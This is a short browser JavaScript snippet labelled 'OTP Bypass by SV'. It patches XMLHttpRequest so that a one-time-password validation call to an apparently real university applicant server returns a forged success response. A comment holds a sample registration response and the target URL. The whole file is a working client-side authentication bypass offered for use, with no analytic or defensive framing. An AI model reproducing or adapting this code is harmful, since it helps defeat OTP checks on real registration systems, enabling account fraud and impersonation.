(function () {
  const urlParams = new URLSearchParams(window.location.search);

  console.log("🧪 OTP Bypass by SV");

  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    this._url = url;
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    if (this._url.includes("/server/o/mql") && body.includes("dbPresentOTPValidate")) {
      console.log("✅ Intercepted dbPresentOTPValidate");

      this.addEventListener("readystatechange", function () {
        if (this.readyState === 4) {
          Object.defineProperty(this, "responseText", {
            get: function () {
              return JSON.stringify({
                dbPresentOTPValidate: {
                  result: { user: "email@example.com" },
                  error: null,
                  reponseHeader: null,
                  errorCode: 0,
                  debugInfo: {
                    stackTrace: null,
                    performanceInfo: null,
                  },
                  isCompressed: false,
                  serverTime: new Date().toISOString(),
                },
              });
            },
          });
        }
      });


      /* {
    "ValidateMobileOTPForRegistration": {
        "result": {
            "OTPMobile": "OTPFOUND"
        },
        "error": null,
        "reponseHeader": null,
        "errorCode": 1000,
        "debugInfo": {
            "stackTrace": null,
            "performanceInfo": null
        },
        "isCompressed": false,
        "serverTime": "2025-09-05T17:56:30.926211183+05:30"
    }
}


https://ycmouadm.dulive.ac/applicant-server/o/mql

*/
    }

    return originalSend.apply(this, arguments);
  };
})();
